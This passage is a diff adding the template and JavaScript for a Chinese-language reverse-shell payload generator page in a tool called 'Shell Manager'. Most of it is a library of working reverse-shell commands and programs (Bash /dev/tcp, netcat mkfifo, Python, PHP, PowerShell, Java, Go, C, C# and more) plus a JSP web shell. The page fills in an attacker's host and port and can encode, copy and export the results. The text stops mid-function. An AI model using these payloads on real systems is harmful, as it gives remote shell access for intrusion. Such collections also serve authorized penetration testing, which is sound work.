@@ -1,0 +1,541 @@
+{% extends "base.html" %}
+
+{% block title %}载荷生成器 - Shell Manager{% endblock %}
+
+{% block active_page %}payload{% endblock %}
+
+{% block page_title %}载荷生成器{% endblock %}
+
+{% block content %}
+<!-- 基础配置 -->
+<div class="card card-region card-region--config">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title">基础配置</h3>
+            <p class="card-subtitle">设置目标IP和端口</p>
+        </div>
+    </div>
+    <div class="payload-config-grid">
+        <div class="input-group">
+            <label class="input-label">目标IP地址</label>
+            <input type="text" class="input" id="target-host" placeholder="例如: 192.168.1.100" value="">
+            <div class="payload-hint">目标机器将连接到此IP</div>
+        </div>
+        <div class="input-group">
+            <label class="input-label">目标端口</label>
+            <input type="number" class="input" id="target-port" value="4444" min="1" max="65535">
+            <div class="payload-hint">监听端口</div>
+        </div>
+        <div class="input-group">
+            <label class="input-label">编码格式</label>
+            <select class="input" id="encoding">
+                <option value="none">无编码</option>
+                <option value="base64">Base64</option>
+                <option value="url">URL编码</option>
+                <option value="hex">Hex编码</option>
+            </select>
+        </div>
+    </div>
+    <div class="payload-actions-row">
+        <button type="button" class="btn btn-primary" onclick="generateAllPayloads()">
+            <span class="icon icon-magic" aria-hidden="true"></span> 生成所有载荷
+        </button>
+        <button type="button" class="btn btn-secondary" onclick="getLocalIP()">
+            <span class="icon icon-globe" aria-hidden="true"></span> 获取本机IP
+        </button>
+    </div>
+</div>
+
+<!-- 搜索和筛选 -->
+<div class="card card-region card-region--filter">
+    <div class="payload-filter-toolbar">
+        <div class="payload-search-wrap">
+            <input type="text" class="input" id="payload-search" placeholder="搜索载荷..." oninput="filterPayloads()">
+        </div>
+        <div class="payload-filter-chips" role="toolbar" aria-label="载荷分类筛选">
+            <button type="button" class="btn btn-ghost btn-sm filter-btn active" data-filter="all" onclick="setFilter('all')">全部</button>
+            <button type="button" class="btn btn-ghost btn-sm filter-btn" data-filter="bash" onclick="setFilter('bash')">Bash</button>
+            <button type="button" class="btn btn-ghost btn-sm filter-btn" data-filter="nc" onclick="setFilter('nc')">Netcat</button>
+            <button type="button" class="btn btn-ghost btn-sm filter-btn" data-filter="python" onclick="setFilter('python')">Python</button>
+            <button type="button" class="btn btn-ghost btn-sm filter-btn" data-filter="php" onclick="setFilter('php')">PHP</button>
+            <button type="button" class="btn btn-ghost btn-sm filter-btn" data-filter="perl" onclick="setFilter('perl')">Perl</button>
+            <button type="button" class="btn btn-ghost btn-sm filter-btn" data-filter="powershell" onclick="setFilter('powershell')">PowerShell</button>
+            <button type="button" class="btn btn-ghost btn-sm filter-btn" data-filter="java" onclick="setFilter('java')">Java</button>
+            <button type="button" class="btn btn-ghost btn-sm filter-btn" data-filter="other" onclick="setFilter('other')">其他</button>
+        </div>
+    </div>
+</div>
+
+<!-- 载荷列表容器 -->
+<div id="payloads-container">
+    <!-- 动态生成载荷 -->
+</div>
+
+<!-- 批量操作 -->
+<div class="card card-region card-region--batch">
+    <div class="card-header">
+        <div>
+            <h3 class="card-title card-title--with-icon"><span class="icon icon-clipboard" aria-hidden="true"></span> 批量操作</h3>
+            <p class="card-subtitle">导出或复制所有载荷</p>
+        </div>
+    </div>
+    <div class="payload-batch-actions">
+        <button type="button" class="btn btn-primary" onclick="copyAllPayloads()">
+            <span class="icon icon-clipboard" aria-hidden="true"></span> 复制所有载荷
+        </button>
+        <button type="button" class="btn btn-secondary" onclick="exportPayloads()">
+            <span class="icon icon-save" aria-hidden="true"></span> 导出为文件
+        </button>
+        <button type="button" class="btn btn-secondary" onclick="generateCheatsheet()">
+            <span class="icon icon-book" aria-hidden="true"></span> 生成速查表
+        </button>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+// 完整的载荷库
+const payloads = [
+    // ============ Bash 载荷 ============
+    { id: 'bash_196_tcp', name: 'Bash 196 TCP', category: 'bash', desc: 'Bash TCP反弹 (文件描述符196)',
+      code: '0<&196;exec 196<>/dev/tcp/{HOST}/{PORT}; sh <&196 >&196 2>&196' },
+    { id: 'bash_196_udp', name: 'Bash 196 UDP', category: 'bash', desc: 'Bash UDP反弹',
+      code: '0<&196;exec 196<>/dev/udp/{HOST}/{PORT}; sh <&196 >&196 2>&196' },
+    { id: 'bash_read_line', name: 'Bash read line', category: 'bash', desc: 'Bash逐行读取反弹',
+      code: 'exec 5<>/dev/tcp/{HOST}/{PORT};cat <&5 | while read line; do $line 2>&5 >&5; done' },
+    { id: 'bash_5', name: 'Bash 5', category: 'bash', desc: 'Bash文件描述符5反弹',
+      code: 'bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1' },
+    { id: 'bash_udp', name: 'Bash UDP', category: 'bash', desc: 'Bash UDP协议反弹',
+      code: 'bash -i >& /dev/udp/{HOST}/{PORT} 0>&1' },
+    
+    // ============ Netcat 载荷 ============
+    { id: 'nc_mkfifo', name: 'nc mkfifo', category: 'nc', desc: 'Netcat mkfifo管道反弹',
+      code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {HOST} {PORT} >/tmp/f' },
+    { id: 'nc_mknod', name: 'nc mknod', category: 'nc', desc: 'Netcat mknod管道反弹',
+      code: 'rm -f /tmp/p; mknod /tmp/p p && nc {HOST} {PORT} 0/tmp/p' },
+    { id: 'nc_e', name: 'nc -e', category: 'nc', desc: 'Netcat -e参数反弹 (需要支持-e)',
+      code: 'nc -e /bin/sh {HOST} {PORT}' },
+    { id: 'nc_pipe', name: 'nc |', category: 'nc', desc: 'Netcat管道反弹方式1',
+      code: 'rm -f /tmp/p; mknod /tmp/p p; nc {HOST} {PORT} 0</tmp/p | /bin/sh >/tmp/p' },
+    { id: 'nc_pipe2', name: 'nc | 2', category: 'nc', desc: 'Netcat管道反弹方式2',
+      code: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {HOST} {PORT} >/tmp/f' },
+    { id: 'nc_exe', name: 'nc.exe -e', category: 'nc', desc: 'Windows Netcat反弹',
+      code: 'nc.exe -e cmd.exe {HOST} {PORT}' },
+    { id: 'busybox_nc', name: 'BusyBox nc -e', category: 'nc', desc: 'BusyBox内置nc反弹',
+      code: 'busybox nc {HOST} {PORT} -e /bin/sh' },
+    { id: 'nc_c', name: 'nc -c', category: 'nc', desc: 'Netcat -c参数反弹',
+      code: 'nc -c bash {HOST} {PORT}' },
+    { id: 'ncat_e', name: 'ncat -e', category: 'nc', desc: 'Ncat反弹 (支持SSL)',
+      code: 'ncat {HOST} {PORT} -e /bin/sh' },
+    { id: 'ncat_exe', name: 'ncat.exe -e', category: 'nc', desc: 'Windows Ncat反弹',
+      code: 'ncat.exe {HOST} {PORT} -e cmd.exe' },
+    { id: 'ncat_udp', name: 'ncat udp', category: 'nc', desc: 'Ncat UDP反弹',
+      code: 'ncat --udp {HOST} {PORT} -e /bin/sh' },
+    { id: 'rustcat', name: 'rustcat', category: 'nc', desc: 'Rustcat反弹Shell',
+      code: 'rcat connect {HOST} {PORT} -r /bin/sh' },
+    
+    // ============ Python 载荷 ============
+    { id: 'python1', name: 'Python #1', category: 'python', desc: 'Python 2反弹Shell',
+      code: 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{HOST}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]); \'' },
+    { id: 'python2', name: 'Python #2', category: 'python', desc: 'Python 2紧凑版',
+      code: 'python -c \'exec(__import__("socket").socket(__import__("socket").AF_INET,__import__("socket").SOCK_STREAM).connect_ex(("{HOST}",{PORT}));__import__("os").dup2(0,0);__import__("os").dup2(0,1);__import__("os").dup2(0,2);__import__("subprocess").call(["/bin/sh","-i"]))\'' },
+    { id: 'python3_1', name: 'Python3 #1', category: 'python', desc: 'Python 3标准反弹',
+      code: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{HOST}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]) \'' },
+    { id: 'python3_2', name: 'Python3 #2', category: 'python', desc: 'Python 3另一种写法',
+      code: 'python3 -c \'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{HOST}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash") \'' },
+    { id: 'python3_win', name: 'Python3 Windows', category: 'python', desc: 'Python 3 Windows反弹',
+      code: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{HOST}",{PORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["cmd.exe"]) \'' },
+    { id: 'python_short', name: 'Python3 shortest', category: 'python', desc: 'Python最短反弹',
+      code: 'python3 -c \'import pty;pty.spawn("/bin/bash")\' # 连接到现有shell后升级' },
+    
+    // ============ PHP 载荷 ============
+    { id: 'php_emoji', name: 'PHP Emoji', category: 'php', desc: 'PHP Emoji短标签反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'' },
+    { id: 'php_pentest', name: 'PHP PentestMonkey', category: 'php', desc: 'PentestMonkey PHP反弹',
+      code: '<?php set_time_limit (0); $VERSION = "1.0"; $ip = "{HOST}"; $port = {PORT}; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \'uname -a; w; id; /bin/sh -i\'; $daemon = 0; $debug = 0; ... ?>' },
+    { id: 'php_ivan', name: 'PHP Ivan Sincek', category: 'php', desc: 'Ivan Sincek PHP反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);proc_close($proc);\'' },
+    { id: 'php_cmd', name: 'PHP cmd', category: 'php', desc: 'PHP cmd反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'' },
+    { id: 'php_cmd2', name: 'PHP cmd 2', category: 'php', desc: 'PHP cmd反弹方式2',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});`/bin/sh -i <&3 >&3 2>&3`; \'' },
+    { id: 'php_cmd_small', name: 'PHP cmd small', category: 'php', desc: 'PHP最短命令反弹',
+      code: 'php -r \'\'+$s=fsockopen("{HOST}",{PORT});`/bin/sh -i<&3>&3 2>&3`; \'' },
+    { id: 'php_exec', name: 'PHP exec', category: 'php', desc: 'PHP exec函数反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");\'' },
+    { id: 'php_shell_exec', name: 'PHP shell_exec', category: 'php', desc: 'PHP shell_exec函数反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});shell_exec("/bin/sh -i <&3 >&3 2>&3");\'' },
+    { id: 'php_system', name: 'PHP system', category: 'php', desc: 'PHP system函数反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});system("/bin/sh -i <&3 >&3 2>&3");\'' },
+    { id: 'php_passthru', name: 'PHP passthru', category: 'php', desc: 'PHP passthru函数反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});passthru("/bin/sh -i <&3 >&3 2>&3");\'' },
+    { id: 'php_backtick', name: 'PHP `', category: 'php', desc: 'PHP反引号反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});`/bin/sh -i <&3 >&3 2>&3`; \'' },
+    { id: 'php_popen', name: 'PHP popen', category: 'php', desc: 'PHP popen函数反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});$h=popen("/bin/sh -i","r");while(!feof($h))echo fread($h,4096);pclose($h); \'' },
+    { id: 'php_proc_open', name: 'PHP proc_open', category: 'php', desc: 'PHP proc_open函数反弹',
+      code: 'php -r \'$sock=fsockopen("{HOST}",{PORT});$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);proc_close($proc);\'' },
+    
+    // ============ Perl 载荷 ============
+    { id: 'perl', name: 'Perl', category: 'perl', desc: 'Perl标准反弹',
+      code: 'perl -e \'use Socket;$i="{HOST}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' },
+    { id: 'perl_no_sh', name: 'Perl no sh', category: 'perl', desc: 'Perl不依赖/bin/sh',
+      code: 'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{HOST}:{PORT}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>\'; \'' },
+    { id: 'perl_pentest', name: 'Perl PentestMonkey', category: 'perl', desc: 'PentestMonkey Perl反弹',
+      code: 'perl -e \'use Socket;$i="{HOST}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'' },
+    
+    // ============ PowerShell 载荷 ============
+    { id: 'powershell1', name: 'PowerShell #1', category: 'powershell', desc: 'PowerShell基础反弹',
+      code: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{HOST}\',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
+    { id: 'powershell2', name: 'PowerShell #2', category: 'powershell', desc: 'PowerShell简化版',
+      code: 'powershell -c "$client=New-Object System.Net.Sockets.TCPClient(\'{HOST}\',{PORT});$stream=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$stream.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.UTF8Encoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String); $sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sb=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb,0,$sb.Length);$stream.Flush()};$client.Close()"' },
+    { id: 'powershell3', name: 'PowerShell #3', category: 'powershell', desc: 'PowerShell基础版',
+      code: 'powershell -nop -exec bypass -c "$s=New-Object IO.StreamReader((New-Object Net.Sockets.TcpClient(\'{HOST}\',{PORT})).GetStream());while(($l=$s.ReadLine()) -ne \'exit\'){($o=iex $l 2>&1 | Out-String );(New-Object IO.StreamWriter((New-Object Net.Sockets.TcpClient(\'{HOST}\',{PORT})).GetStream())).WriteLine($o)}"' },
+    { id: 'powershell_b64', name: 'PowerShell #3 (Base64)', category: 'powershell', desc: 'PowerShell Base64编码',
+      code: 'powershell -nop -enc [Base64编码的命令]' },
+    { id: 'powershell_tls', name: 'PowerShell #4 (TLS)', category: 'powershell', desc: 'PowerShell TLS加密',
+      code: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TcpClient(\'{HOST}\',{PORT});$stream = $client.GetStream();$ssl = New-Object System.Net.Security.SslStream($stream);$ssl.AuthenticateAsClient(\'{HOST}\');..."' },
+    { id: 'powershell_powercat', name: 'PowerShell #5 (powercat)', category: 'powershell', desc: '使用powercat模块',
+      code: 'powercat -c {HOST} -p {PORT} -e cmd' },
+    { id: 'windows_conpty', name: 'Windows ConPty', category: 'powershell', desc: 'Windows伪终端',
+      code: 'stty raw -echo; (stty size; cat) | nc -lp {PORT} | powershell -NoP -NonI -W Hidden -Exec Bypass -Enc [Base64编码]' },
+    
+    // ============ Ruby 载荷 ============
+    { id: 'ruby1', name: 'Ruby #1', category: 'other', desc: 'Ruby反弹Shell',
+      code: 'ruby -rsocket -e\'f=TCPSocket.open("{HOST}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'' },
+    { id: 'ruby_no_sh', name: 'Ruby no sh', category: 'other', desc: 'Ruby不依赖/bin/sh',
+      code: 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{HOST}","{PORT}");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'' },
+    
+    // ============ socat 载荷 ============
+    { id: 'socat1', name: 'socat #1', category: 'other', desc: 'socat反弹Shell',
+      code: 'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{HOST}:{PORT}' },
+    { id: 'socat_tty', name: 'socat #2 (TTY)', category: 'other', desc: 'socat TTY反弹',
+      code: 'socat file:`tty`,raw,echo=0 tcp-listen:{PORT}' },
+    
+    // ============ Node.js 载荷 ============
+    { id: 'nodejs1', name: 'node.js', category: 'other', desc: 'Node.js反弹Shell',
+      code: 'require(\'child_process\').exec(\'nc -e /bin/sh {HOST} {PORT}\')' },
+    { id: 'nodejs2', name: 'node.js #2', category: 'other', desc: 'Node.js原生反弹',
+      code: '(function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({PORT},"{HOST}",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();' },
+    
+    // ============ Java 载荷 ============
+    { id: 'java1', name: 'Java #1', category: 'java', desc: 'Java Runtime反弹',
+      code: 'Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1"});' },
+    { id: 'java2', name: 'Java #2', category: 'java', desc: 'Java ProcessBuilder反弹',
+      code: 'new ProcessBuilder("/bin/bash","-c","bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1").start();' },
+    { id: 'java3', name: 'Java #3', category: 'java', desc: 'Java Socket反弹',
+      code: 'String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1"};Runtime.getRuntime().exec(cmd);' },
+    { id: 'java_web', name: 'Java Web', category: 'java', desc: 'Java Web Shell',
+      code: '<%@ page import="java.util.*,java.io.*"%><% String cmd = request.getParameter("cmd"); Process p = Runtime.getRuntime().exec(cmd); BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream())); String line; while((line=br.readLine())!=null){out.println(line);} %>' },
+    { id: 'java_two_way', name: 'Java Two Way', category: 'java', desc: 'Java双向Shell',
+      code: 'import java.io.*;import java.net.*;public class Rev{public static void main(String[]a){try{Socket s=new Socket("{HOST}",{PORT});Process p=Runtime.getRuntime().exec("/bin/sh");InputStream is=s.getInputStream();OutputStream os=s.getOutputStream();...}}}' },
+    
+    // ============ JavaScript 载荷 ============
+    { id: 'javascript', name: 'Javascript', category: 'other', desc: 'JavaScript反弹Shell',
+      code: '(function(){var s=new WebSocket("ws://{HOST}:{PORT}");s.onmessage=function(e){eval(e.data);};})();' },
+    
+    // ============ Groovy 载荷 ============
+    { id: 'groovy', name: 'Groovy', category: 'other', desc: 'Groovy反弹Shell',
+      code: 'String host="{HOST}";int port={PORT};String cmd="bash -i";Process p=new ProcessBuilder(cmd.split(" ")).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();' },
+    
+    // ============ OpenSSL 载荷 ============
+    { id: 'openssl', name: 'OpenSSL', category: 'other', desc: 'OpenSSL加密反弹',
+      code: 'mkfifo /tmp/s;/bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {HOST}:{PORT} > /tmp/s;rm /tmp/s' },
+    
+    // ============ Telnet 载荷 ============
+    { id: 'telnet', name: 'telnet', category: 'other', desc: 'Telnet反弹',
+      code: 'rm -f /tmp/p; mknod /tmp/p p && telnet {HOST} {PORT} 0/tmp/p' },
+    { id: 'telnet_mknod', name: 'telnet mknod', category: 'other', desc: 'Telnet mknod反弹',
+      code: 'mknod /tmp/backpipe p; telnet {HOST} {PORT} 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe' },
+    { id: 'telnet_split', name: 'telnet输入输出分离', category: 'other', desc: 'Telnet分离输入输出',
+      code: 'telnet {HOST} {PORT} | /bin/bash | telnet {HOST} {PORT+1}' },
+    
+    // ============ Zsh 载荷 ============
+    { id: 'zsh', name: 'zsh', category: 'bash', desc: 'Zsh反弹Shell',
+      code: 'zsh -c \'zmodload zsh/net/tcp && ztcp {HOST} {PORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\'' },
+    
+    // ============ Lua 载荷 ============
+    { id: 'lua1', name: 'Lua #1', category: 'other', desc: 'Lua反弹Shell (需要socket库)',
+      code: 'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{HOST}\',\'{PORT}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"' },
+    { id: 'lua2', name: 'Lua #2', category: 'other', desc: 'Lua反弹Shell方式2',
+      code: 'lua5.1 -e \'local host,port="{HOST}",{PORT} local socket=require("socket") local tcp=socket.tcp() local conn=tcp:connect(host,port) if conn then local s=tcp:send("Connected\\n") while true do local r,x=tcp:receive() local cmd=io.popen(r) local out=cmd:read("*a") tcp:send(out) end tcp:close() end\'' },
+    
+    // ============ Golang 载荷 ============
+    { id: 'golang1', name: 'Golang', category: 'other', desc: 'Go反弹Shell',
+      code: 'echo \'package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","{HOST}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\' > /tmp/r.go && go run /tmp/r.go' },
+    { id: 'golang2', name: 'Golang2', category: 'other', desc: 'Go编译后反弹',
+      code: 'package main;import("os/exec";"net");func main(){c,_:=net.Dial("tcp","{HOST}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' },
+    { id: 'golang3', name: 'Golang3', category: 'other', desc: 'Go简洁版',
+      code: 'go run - <<EOF\npackage main\nimport("net";"os/exec")\nfunc main(){c,_:=net.Dial("tcp","{HOST}:{PORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}\nEOF' },
+    
+    // ============ Vlang 载荷 ============
+    { id: 'vlang', name: 'Vlang', category: 'other', desc: 'V语言反弹Shell',
+      code: 'import net import os fn main() { mut c := net.dial_tcp("{HOST}:{PORT}") or { exit(1) } mut p := os.new_process("/bin/sh") p.stdin = c p.stdout = c p.stderr = c p.run() }' },
+    
+    // ============ Awk 载荷 ============
+    { id: 'awk', name: 'Awk', category: 'other', desc: 'AWK反弹Shell',
+      code: 'awk \'BEGIN {s = "/inet/tcp/0/{HOST}/{PORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}\'' },
+    
+    // ============ Dart 载荷 ============
+    { id: 'dart', name: 'Dart', category: 'other', desc: 'Dart反弹Shell',
+      code: 'import \'dart:io\';import \'dart:convert\';void main() async {var s=await Socket.connect(\'{HOST}\',{PORT});s.write(\'Connected\\n\');await for(var line in s.transform(utf8.decoder).transform(LineSplitter())) {var r=Process.runSync(\'/bin/sh\',[\'-c\',line]);s.write(r.stdout);s.write(r.stderr);}}' },
+    
+    // ============ TCL 载荷 ============
+    { id: 'tcl', name: 'TCL脚本', category: 'other', desc: 'TCL反弹Shell',
+      code: 'echo \'set s [socket {HOST} {PORT}];while {42} {puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} {puts $s $r};flush $s};close $s\' | tclsh' },
+    
+    // ============ C 语言载荷 ============
+    { id: 'c_tcp', name: 'C', category: 'other', desc: 'C语言TCP反弹',
+      code: '#include <stdio.h>#include <sys/socket.h>#include <netinet/in.h>int main(){struct sockaddr_in s;s.sin_family=AF_INET;s.sin_port=htons({PORT});s.sin_addr.s_addr=inet_addr("{HOST}");int c=socket(AF_INET,SOCK_STREAM,0);connect(c,(struct sockaddr*)&s,sizeof(s));dup2(c,0);dup2(c,1);dup2(c,2);execl("/bin/sh","sh",(char*)0);}' },
+    { id: 'c_windows', name: 'C Windows', category: 'other', desc: 'C语言Windows反弹',
+      code: '#include <winsock2.h>#include <stdio.h>#pragma comment(lib,"ws2_32")int main(){WSADATA w;WSAStartup(MAKEWORD(2,0),&w);SOCKET s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a;a.sin_family=AF_INET;a.sin_port=htons({PORT});a.sin_addr.s_addr=inet_addr("{HOST}");connect(s,(struct sockaddr*)&a,sizeof(a));STARTUPINFO si;PROCESS_INFORMATION pi;ZeroMemory(&si,sizeof(si));si.cb=sizeof(si);si.dwFlags=STARTF_USESTDHANDLES;si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,0,NULL,NULL,&si,&pi);}' },
+    
+    // ============ C# 载荷 ============
+    { id: 'csharp_tcp', name: 'C# TCP Client', category: 'other', desc: 'C# TCP客户端反弹',
+      code: 'using System;using System.Net.Sockets;using System.Diagnostics;class Rev{static void Main(){using(var c=new TcpClient("{HOST}",{PORT})){using(var s=c.GetStream()){using(var p=new Process()){p.StartInfo.FileName="cmd.exe";p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardInput=true;p.StartInfo.RedirectStandardOutput=true;p.StartInfo.RedirectStandardError=true;p.Start();p.StandardInput.BaseStream.CopyTo(s);s.CopyTo(p.StandardOutput.BaseStream);}}}}}' },
+    { id: 'csharp_bash', name: 'C# Bash -i', category: 'other', desc: 'C# Bash反弹',
+      code: 'using System.Diagnostics;Process.Start("bash","-c \"bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1\"");' },
+    
+    // ============ Haskell 载荷 ============
+    { id: 'haskell', name: 'Haskell #1', category: 'other', desc: 'Haskell反弹Shell',
+      code: 'module Main whereimport Network.Socketimport System.Processmain=withSocketsDo$do s<-socket AF_INET Stream defaultProtocol connect s(SockAddrInet {PORT} $ tupleToHostAddress({HOST})) (h,_,_,_)<-createProcess(shell "/bin/sh"){std_in=UseHandle s,std_out=UseHandle s,std_err=UseHandle s}waitForProcess h' },
+];
+
+let currentFilter = 'all';
+
+// 生成载荷
+function generatePayload(template, host, port) {
+    return template.replace(/{HOST}/g, host).replace(/{PORT}/g, port);
+}
+
+// 编码载荷
+function encodePayload(code, encoding) {
+    switch (encoding) {
+        case 'base64':
+            try {
+                return btoa(code);
+            } catch (e) {
+                return 'Base64编码失败';
+            }
+        case 'url':
+            return encodeURIComponent(code);
+        case 'hex':
+            return code.split('').map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+        default:
+            return code;
+    }
+}
+
+// 渲染载荷
+function renderPayloads() {
+    const host = document.getElementById('target-host').value || 'YOUR_IP';
+    const port = document.getElementById('target-port').value || '4444';
+    const encoding = document.getElementById('encoding').value;
+    const searchTerm = document.getElementById('payload-search').value.toLowerCase();
+    
+    const container = document.getElementById('payloads-container');
+    
+    // 按类别分组
+    const categories = {
+        'bash': { name: 'Bash / Shell', iconClass: 'icon-terminal', items: [] },
+        'nc': { name: 'Netcat / Ncat', iconClass: 'icon-plug', items: [] },
+        'python': { name: 'Python', iconClass: 'icon-braces', items: [] },
+        'php': { name: 'PHP', iconClass: 'icon-braces', items: [] },
+        'perl': { name: 'Perl', iconClass: 'icon-braces', items: [] },
+        'powershell': { name: 'PowerShell', iconClass: 'icon-window', items: [] },
+        'java': { name: 'Java', iconClass: 'icon-archive', items: [] },
+        'other': { name: '其他语言', iconClass: 'icon-package', items: [] }
+    };
+    
+    payloads.forEach(p => {
+        // 应用过滤
+        if (currentFilter !== 'all' && p.category !== currentFilter) return;
+        if (searchTerm && !p.name.toLowerCase().includes(searchTerm) && !p.desc.toLowerCase().includes(searchTerm)) return;
+        
+        const generatedCode = generatePayload(p.code, host, port);
+        const displayCode = encodePayload(generatedCode, encoding);
+        
+        if (categories[p.category]) {
+            categories[p.category].items.push({ ...p, code: displayCode, originalCode: generatedCode });
+        }
+    });
+    
+    let html = '';
+    for (const [key, cat] of Object.entries(categories)) {
+        if (cat.items.length === 0) continue;
+        
+        html += `
+            <div class="payload-region payload-region--${key}" data-category="${key}">
+                <div class="payload-section">
+                <div class="payload-section-title"><span class="icon ${cat.iconClass}" aria-hidden="true"></span><span>${cat.name}</span></div>
+                <div class="payload-grid">
+                    ${cat.items.map(p => `
+                        <div class="payload-card" data-id="${p.id}" data-category="${key}">
+                            <div class="payload-card-header">
+                                <div>
+                                    <div class="payload-card-title">${escapeHtml(p.name)}</div>
+                                    <div class="payload-card-desc">${escapeHtml(p.desc)}</div>
+                                </div>
+                                <div class="payload-card-actions">
+                                    <button type="button" class="btn btn-ghost btn-sm" onclick="copyPayload('${escapeHtml(p.originalCode)}')" title="复制" aria-label="复制载荷"><span class="icon icon-clipboard" aria-hidden="true"></span></button>
+                                </div>
+                            </div>
+                            <div class="payload-card-body">
+                                <div class="payload-code">${escapeHtml(p.code)}</div>
+                                <div class="payload-tags">
